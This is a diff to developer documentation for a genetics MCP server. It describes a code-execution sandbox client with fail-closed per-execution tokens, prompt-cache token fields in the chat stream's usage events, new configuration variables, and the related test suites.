+  - `scripts/analyze_conversations.py --sdk-log PATH` parses these lines back into per-session
+    SDK stats reported **alongside**, never folded into, the tool counts: a tool call is one
+    model decision, an SDK call is one line of a script. The source is a log, not
+    `chat_history.db` — the calls happen in another process and are never persisted as message
+    content — so with no `--sdk-log` the report states the log is absent instead of printing zero.
+    It also reads the log-level notices: a shared-stream warning makes the whole SDK section
+    say the counts are an upper bound over forgeable lines, truncation records say how many
+    executions lost their tail, and refusals are counted separately from data accesses. The
+    per-session `sdk_sequence` is bounded to the first 50 calls with the elided count appended
+    (a script can make thousands, and the untrimmed join was a ~150 KB cell in every metrics row
+    and CSV); the per-function totals in the report come from the exact `sdk_function_counts`
+    column instead, which is bounded by the number of SDK functions.
 - **Importable standalone.** Nothing under `sdk/` imports the chat backend, the LLM service,
   the MCP server or the SQLite databases, so the package can be installed into a sandbox image
   on its own. `test_sdk.py` asserts this in a subprocess.
@@ -871,6 +1259,8 @@ src/genetics_mcp_server/
 ├── rate_limit.py        # per-user sliding window rate limiter
 ├── cost.py              # Anthropic API cost estimation
 ├── download_store.py    # disk-persisted download storage for TSV files
+├── sandbox_token.py     # mints the per-execution, audience-scoped sandbox credentials
+├── sandbox_client.py    # HTTP transport to the sandbox supervisor (POST /execute, GET /health)
 ├── config/
 │   ├── __init__.py
 │   ├── settings.py      # configuration dataclass
@@ -924,6 +1314,44 @@ src/genetics_mcp_server/
 2. **Chat API mode**: HTTP → FastAPI → LLMService → Anthropic/OpenAI → ToolExecutor → Genetics API
 3. **Subagent mode**: Main Agent → `launch_subagents` tool → SubagentService → parallel Claude API calls → ToolExecutor/External Tools → results aggregated back to main agent
 4. **SDK mode**: script → `genetics_mcp_server.sdk` → GeneticsClient → ToolExecutor → Genetics API / BigQuery. Same executor, different entry point: no tool schema, no context row cap, polars frames instead of result envelopes.
+
+### Sandbox transport (`sandbox_client.py`)
+
+The client half of the seam between chat-backend and the code-execution sandbox. The wire
+contract lives in `docs/code-execution-security.md` §2 of **genetics-results-suite**, not
+here, and that is structural rather than an oversight: the sandbox image pip-installs only
+the SDK's import closure and prunes the rest, so the supervisor and this client cannot share
+a module and the document is the only definition both ends can read. Every number the two
+sides must agree on is a named constant at the top of `sandbox_client.py` rather than a
+literal at a call site.
+
+- **One credential per execution, minted at the last possible moment.** `execute()` calls
+  `mint_execution_tokens` *inside* the retry loop. The tokens live 300s and a queued
+  execution eats that slack (a full queued wait then a full run leaves ~60s of token life),
+  so a pair minted before a wait would spend itself on the wait.
+- **Fail closed.** `SandboxTokenUnavailable` is never caught. With no signing key there is no
+  execution — the alternatives are sending no credential or sending `INTERNAL_API_SECRET`,
+  which are the two outcomes the mechanism exists to prevent. Tokens are never logged, and a
+  token echoed back by the supervisor in **either** half of an error object — `error.type` as
+  well as `error.message` — is scrubbed and capped before any error text is built or attached
+  to the exception (`error.type` is carried onto `SandboxError.error_type`, so scrubbing only
+  the formatted message would have left the raw value on the exception).
+- **A retry always mints a fresh `execution_id`.** A repeated id is refused with
+  `409 DuplicateExecutionId`, so reusing one after a `429` would turn a queue collision into
+  a hard failure. `409 TokenExpired` is the opposite case and is retried immediately.
+- **"No sandbox" is a distinct failure from "your script failed".** `SandboxUnavailable`
+  covers a refused connection, `503 NotReady` and gateway errors, because `strategy: Recreate`
+  plus a 130s termination grace leaves no sandbox at all for up to ~130s of a deploy. The read
+  deadline is queue wait **plus** the full run plus margin, so it clears the supervisor's own
+  worst case; a script that runs too long is a `200` with `status: "timeout"`, never an
+  exception here.
+- **Transport only.** The supervisor's result object is returned unchanged for the tool layer
+  to render. `error.type` is treated as an open string — the reserved supervisor names are
+  branched on, anything else is carried through as an opaque label.
+- **No total deadline, deliberately.** Each attempt is bounded; the sum is not (~585 s worst
+  case). The cap belongs to whoever owns the chat turn, and that is `run_analysis` — see
+  `ToolExecutor._RUN_ANALYSIS_DEADLINE_S` under Code execution tools. Its only caller is that
+  handler.
 
 ### Turn termination and truncation
 
@@ -985,21 +1413,55 @@ The chat API streams responses as Server-Sent Events (SSE). Each event is a JSON
 |------------|-------------|--------------------|
 | `content` | Streamed text token from the LLM response | `content` (string) |
 | `thinking` | Keepalive emitted while the model reasons. Carries no reasoning content — thinking deltas do not reach the text stream, so without this tick a long reasoning phase reads as a stalled connection to the client's inactivity timeout. Rate-limited to one per 10s | none |
-| `usage` | Context usage snapshot after each agentic loop iteration | `iteration`, `input_tokens`, `output_tokens`, `total_input_tokens`, `total_output_tokens`, `context_window`, `context_percent` |
+| `usage` | Context usage snapshot after each agentic loop iteration | `iteration`, `input_tokens`, `cache_read`, `cache_create`, `output_tokens`, `total_input_tokens`, `total_output_tokens`, `context_window`, `context_percent` |
 | `image` | Base64-encoded image (e.g., PheWAS plot) | `content` (base64 string) |
 | `error` | Error message from the backend | `content` (error string) |
 | `done` | Signals the stream is complete | `message_content` (assistant text + `tool_use` blocks for persistence), `tool_results` (the `tool_result` blocks for this turn, for persistence) |
 
 The `usage` event is emitted by `_stream_anthropic()` in `llm_service.py` after token accounting in each iteration of the agentic loop. It is yielded as a `StreamChunk(type="usage")` with a JSON-serialized payload. The `event_generator()` in `chat_api.py` forwards it as an SSE event, spreading the usage fields into the top-level payload alongside `"type": "usage"`.
 
-Payload fields for `usage`:
+Payload fields for `usage`. Every token count is for the **current** API call unless its
+name says `total_`:
 - `iteration` — current agentic loop iteration number
-- `input_tokens` — input tokens consumed in the current API call
-- `output_tokens` — output tokens generated in the current API call
-- `total_input_tokens` — cumulative input tokens across all iterations
+- `input_tokens` — the **whole context** sent in this call, i.e. Anthropic's
+  `input_tokens + cache_read_input_tokens + cache_creation_input_tokens`. It is **not**
+  the billed uncached input, and it is not comparable to `total_input_tokens`, which
+  accumulates only the uncached part. Named for what the frontend meter renders; its
+  meaning is deliberately frozen (`genetics-results-suite-n3p`)
+- `cache_read` — the part of `input_tokens` served from the prompt cache
+- `cache_create` — the part of `input_tokens` written into the prompt cache. Kept apart
+  from `cache_read` because the two differ by more than 12x in price, so folding them
+  together makes an exact cost underivable
+- `output_tokens` — output tokens generated in this call
+- `total_input_tokens` — cumulative **billed uncached** input across all iterations so
+  far, i.e. the running sum of `input_tokens - cache_read - cache_create`
 - `total_output_tokens` — cumulative output tokens across all iterations
 - `context_window` — total context window size for the model (from `get_context_window()`)
-- `context_percent` — percentage of context window consumed (`total_input_tokens / context_window * 100`)
+- `context_percent` — percentage of the context window this call filled
+  (`input_tokens / context_window * 100`)
+
+A consumer can therefore price **the main agentic loop's Anthropic API calls** exactly
+from the stream alone, with no `chat_turn_metrics` row: uncached input is
+`input_tokens - cache_read - cache_create`, and the three components go to
+`estimate_cost()` unchanged. This matters because secret chat — which every
+replay-benchmark request uses — writes no metrics row at all.
+
+That is not the same as pricing the whole turn. Four things sit outside the sum, and the
+first two sit outside the `chat_turn_metrics` row as well, so the stream and the row
+agree with each other while both understate what was billed:
+
+- **Subagent calls.** `subagent.py` issues its own `messages.create` and keeps private
+  token counters; `_stream_anthropic()` accumulates only `iter_cost` into `total_cost`.
+  A turn that calls `launch_subagents` costs strictly more than either source reports.
+- **Retried attempts.** A mid-stream overload/529 is retried in place, and only the
+  succeeding attempt's `message.usage` is ever read. Tokens burned by the abandoned
+  attempts are billed and invisible.
+- **The OpenAI path emits no `usage` chunk at all.** `_stream_openai()` yields text and
+  `done` only, so this whole section is Anthropic-path-only. `replay_benchmark.py`
+  handles that case with a `no_usage_chunks` status rather than a zero.
+- **The stream carries no model name.** `estimate_cost()` falls back to Sonnet pricing
+  for anything unrecognised (`has_pricing()` exists so callers can refuse instead), so
+  the consumer must learn the model out-of-band and pass it in.
 
 The frontend uses `usage` events to render a live progress bar showing how much of the model's context window has been consumed during the conversation.
 
@@ -1109,8 +1571,11 @@ All configuration is via environment variables (`.env` file supported):
 | Variable | Description | Default |
 |----------|-------------|---------|
 | `GENETICS_PUBLIC_API_URL` | Externally reachable base URL used when building download links shown to users; falls back to `GENETICS_API_URL`, which in a cluster is an internal address | `GENETICS_API_URL` |
-| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info; the pruned sandbox install holds none by design and is exempt | - |
+| `INTERNAL_API_SECRET` | Shared secret sent as `Authorization: Bearer` on every call to results-api and the BigQuery proxy. Optional only for a local run against services that require no internal auth: since `genetics-results-suite-618` the **deployed** entrypoints refuse to start without it (`config.settings.require_internal_api_secret()`, called from `mcp_server.main()` on the remote transports and from `chat_api`'s lifespan when `REQUIRE_AUTH` is true), because the alternative was sending every call **anonymously** with no local signal and nothing in the far end's log to tell it apart from an authenticated one. Only attached to `ToolExecutor.client` — the separate `external_client` carries no default auth, so the secret can never leak to a third-party API such as MouseMine or myvariant.info. The pruned sandbox install holds none by design and uses `SANDBOX_TOKEN_FILE` instead; since `genetics-results-suite-4h6.44` it is no longer exempt from needing *a* credential — a pruned install with neither raises `SandboxCredentialError` at client construction | - |
+| `SANDBOX_TOKEN_FILE` | Path (never the tokens) to the per-execution token file the sandbox supervisor writes before it forks — a JSON object keyed by audience, `{"db-api": ..., "results-api": ...}`. Read **once** and unlinked on the first client build (`tools/executor.py`), then attached per request bound to the destination's audience; mutually exclusive with `INTERNAL_API_SECRET`, and a file that does not yield a usable pair raises rather than degrading to no credential. Set only by the supervisor in the sandbox image; unset everywhere else. Read-once-and-unlink is **not** an exposure bound — see `genetics-results-suite-4h6.55` | - |
 | `CHAT_BACKEND_URL` | Base URL of the chat backend, used by the MCP server to validate per-user API tokens via `POST /v1/tokens/validate` when the two services do not share a filesystem. Authenticated with `INTERNAL_API_SECRET` | - |
+| `SANDBOX_URL` | Base URL of the code-execution sandbox supervisor. **One value, deliberately** — it names the in-cluster Service in production and the local Docker container in development, and `sandbox_client.py` branches on nothing else, because the wire contract is identical in both deployments | `http://127.0.0.1:8080` |
+| `SANDBOX_TOKEN_SIGNING_KEY` | HS256 key for the per-execution sandbox tokens, held only by chat-backend (mint) and db-api/results-api (verify). Separate from `INTERNAL_API_SECRET` on purpose: separate blast radius, independent rotation, and the sandbox holds neither. Unset means **no execution runs** — `mint_execution_tokens` raises `SandboxTokenUnavailable` rather than returning `None`, since every fallback is either "send no credential" or "send the shared secret" | - |
 
 ### LLM providers (for chat API)
 
@@ -1458,6 +1923,8 @@ Tests are in `tests/` using pytest with pytest-asyncio:
 | `test_chat_api.py` | FastAPI endpoints (status, tools, chat) |
 | `test_tools.py` | Tool executor methods |
 | `test_executor_resilience.py` | Upstream-unreachable handling in `_ResilientAsyncClient` |
+| `test_sandbox_client.py` | Sandbox transport against a stubbed HTTP layer (no sandbox, no credentials): the exact request field set, the tokens travelling in the body and never in a header, `execution_id` being the `jti` of both tokens, fail-closed on an unset signing key (nothing is sent), token redaction from logs and exception text (from `error.message` and from `error.type`, the latter asserted on `SandboxError.error_type` too), the result returned unchanged (including a failing script, which is a 200 and not an exception, and an unrecognised open-ended `error.type`), the 429 retry minting a **fresh** `execution_id`, `Retry-After` honoured and capped, `409 TokenExpired` retried immediately while `409 DuplicateExecutionId` is not retried at all, the read deadline clearing queue wait plus the full run, unreachable/`NotReady`/gateway failures separated from script failures, and the local pre-flight rejections, which cover every caller-supplied value the body carries (over-ceiling `timeout_s` rejected not clamped, empty or oversized `code`, an `execution_id` that is not §2's canonical uuid4, an empty `user` or `session_id` — all `SandboxRejected`, so a caller catching `SandboxError` cannot miss one) |
+| `test_code_execution_tools.py` | The code-execution tool layer with no sandbox and no credentials: the SDK catalogue rendering (and what it does **not** disclose), `read_artifact`'s descriptor-based read and its path allow-list, and `run_analysis` against a stubbed transport — the fail-closed path reported as a non-retryable operator error with **nothing sent**, the handler's exception clauses asserted by AST so no `except Exception` can reappear above the named one, the 300 s turn budget (checked against the transport's own constants, not a copied number) reported as "may still be running" rather than as a script failure, each transport failure class kept distinct from a broken script, `execution_id` never reaching the model, a manifest rebuilt to name/size/content_type with paths and URLs dropped, an unknown `status`, an unknown `error.type` and unknown top-level fields all tolerated, and `llm_service` stripping a model-supplied `user`/`session_id` before injecting the authenticated pair |
 | `test_db.py` | Database operations, LLM-config write transaction safety, LLM-config journal mode (WAL, and the reader/writer concurrency it buys), same-second tiebreak in the tool-description, user-setting and user-comment accessors (`changed_at`/`created_at` have one-second resolution, so the later `id` wins; both row orders, blank timestamps, several keys tied at once), and malformed-stamp reads (a NULL or unparseable `changed_at` degrades to the epoch in the singular and plural accessors alike rather than raising or dropping the key, and a group holding both a NULL and a sentinel stamp, `''` or `0` — the one shape that separates the `IS` join from a coalescing one — resolves to the same row in both, and the comment and tool-history reads degrade the same way), chat-history write transaction safety (every write accessor over a failed DML and a failed commit, the retained lock, and the multi-DML writes rolled back whole), and the zone the write path returns (the saves, the version history and `add_user_comment` hand back aware UTC, as the reads do) |
 | `test_chat_history_router.py` | Chat history API |
 | `test_llm_config_router.py` | LLM config API |
@@ -1647,11 +2114,14 @@ harness issues two arms per case. `--base-url` therefore defaults to
 - **The `usage` chunk's `input_tokens` is the whole context**, i.e.
   `input_tokens + cache_read + cache_creation`, while `total_input_tokens`
   accumulates only the billed uncached input. `cached_input_tokens` is therefore
-  derived as `sum(per-iteration input_tokens) - total_input_tokens`, and cache reads
-  cannot be separated from cache creations — they differ by more than 12x in price.
-  **Cost is consequently reported as an interval**, `cost_usd_min` (all cached
+  derived as `sum(per-iteration input_tokens) - total_input_tokens`. The harness
+  cannot split that into cache reads and cache creations, which differ by more than
+  12x in price, so **cost is reported as an interval**, `cost_usd_min` (all cached
   tokens priced as cache reads) to `cost_usd_max` (all priced as cache creations),
-  never as a single fabricated number. Pricing also needs a model name the pricing
+  never as a single fabricated number. The chunk itself no longer forces this:
+  `genetics-results-suite-n3p` added `cache_read` and `cache_create` to the `usage`
+  payload, so an exact figure is now derivable and the harness can drop the interval
+  — it has not been switched over yet. Pricing also needs a model name the pricing
   table actually knows: without `--model`, *or* with a model `cost.has_pricing()`
   cannot match (`gpt-4o`, a transposed `claude-4-opus`), the USD fields are `null`
   ("not priced") with a warning, not `0` and not silently priced at the
